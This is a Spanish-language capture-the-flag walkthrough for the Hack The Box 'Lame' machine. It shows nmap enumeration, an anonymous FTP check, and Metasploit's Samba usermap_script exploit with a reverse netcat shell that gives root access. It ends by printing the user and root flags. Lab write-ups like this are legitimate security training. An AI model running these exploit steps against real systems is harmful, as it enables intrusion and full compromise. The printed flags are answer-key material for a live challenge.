# MÁQUINA LAME
En el siguiente documento se describe la resolución de la máquina Lame, de nivel fácil. 

**URL**: https://app.hackthebox.com/machines/Lame

## ENUMERACIÓN 
Realizamos un escaneo de puertos inicial. 
```
> nmap -sV -sC 10.10.10.3
```
- sV: para obtener la versión de los servicios encontrados. 
- sC: para ejecutar scripts de enumeración, nos proporciona información adicional de cada servicio encontrado.

Obtenemos lo siguiente:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m52s, deviation: 2h49m45s, median: 49s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-06-26T14:35:27-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

De esta información nos quedamos con que hay 4 puertos abiertos, corriendo los siguientes servicios:

| Puerto      | Servicio  | Detalles adicionales        |  
|-------------|-----------|-----------------------------|  
| 21          | FTP       | Anonymous FTP login allowed |  
| 22          | SSH       | -                           |  
| 139, 445    | Samba     | -                           |  


<br>

# FTP
Del escaneo hemos observado que se permite el login anónimo (username: anonymous, contraseña: *en blanco*). Así que probaremos a conectarnos al servidor y obtener un listado de los ficheros publicados. 

```
> ftp 10.10.10.3
> Name (10.10.10.3:kali): anonymous
> Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Usamos *ls* para listar archivos, pues el sistema operativo es UNIX.
```
ftp> ls
229 Entering Extended Passive Mode (|||56188|).
150 Here comes the directory listing.
226 Directory send OK.
```
No hay archivos publicados al parecer.

<br>

# SMB
Del script también vimos que estaba corriendo el servicio Samba (smbd). Vamos a explorar vulnerabilidades en esta otra parte: usaremos metasploit para buscar vulnerabilidades y, en caso de encontrarlas, explotarlas. 

Abrimos *msfconsole*. 
```
> msfconsole
```
Una vez dentro, buscamos vulnerabilidades por el nombre del servicio y la versión.
```
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

```
Hemos encontrado una vulnerabilidad. Vamos a explotarla. <br> 
Escribimos *use* y el nombre del módulo. 
```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > 
```

*Show options* para ver cómo rellenar los datos.
```
> show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type
                                       :host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metaspl
                                       oit.com/docs/using-metasploit/basics/using-m
                                       etasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.85     yes       The listen address (an interface may be specif
                                     ied)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

RHOSTS es obligatorio rellenarlo y por el momento está vacío. Escribimos la dirección IP de la máquina víctima.
```
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```

Si escrimos *show options* de nuevo vemos que ya aparece RHOSTS relleno.
```
> show options
```
```
Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type
                                       :host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)
```

Ya tenemos todos los datos obligatorios *(required)* rellenos, así que podemos lanzar el exploit. 
```
>  run

[*] Started reverse TCP handler on 10.10.16.85:4444 
[*] Command shell session 1 opened (10.10.16.85:4444 -> 10.10.10.3:40079) at 2025-06-26 16:46:19 -0400

whoami
root

```
Como podemos ver, tenemos acceso directamente como root. <br>
Procedemos a navegar por los archivos de la máquina víctima hasta encontrar las flags. 
```
cd /home/
ls
ftp
makis
service
user
cd user
ls
cd ..
cd makis
ls
user.txt
cat user.txt
2600568262a5ef963f276641456e7b13
```
```
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
0a7442657fd3582910845ced12d42660
```
<br>
Encontradas las 2 flags: 

- **Flag de usuario:** 2600568262a5ef963f276641456e7b13
- **Flag de root:** 0a7442657fd3582910845ced12d42660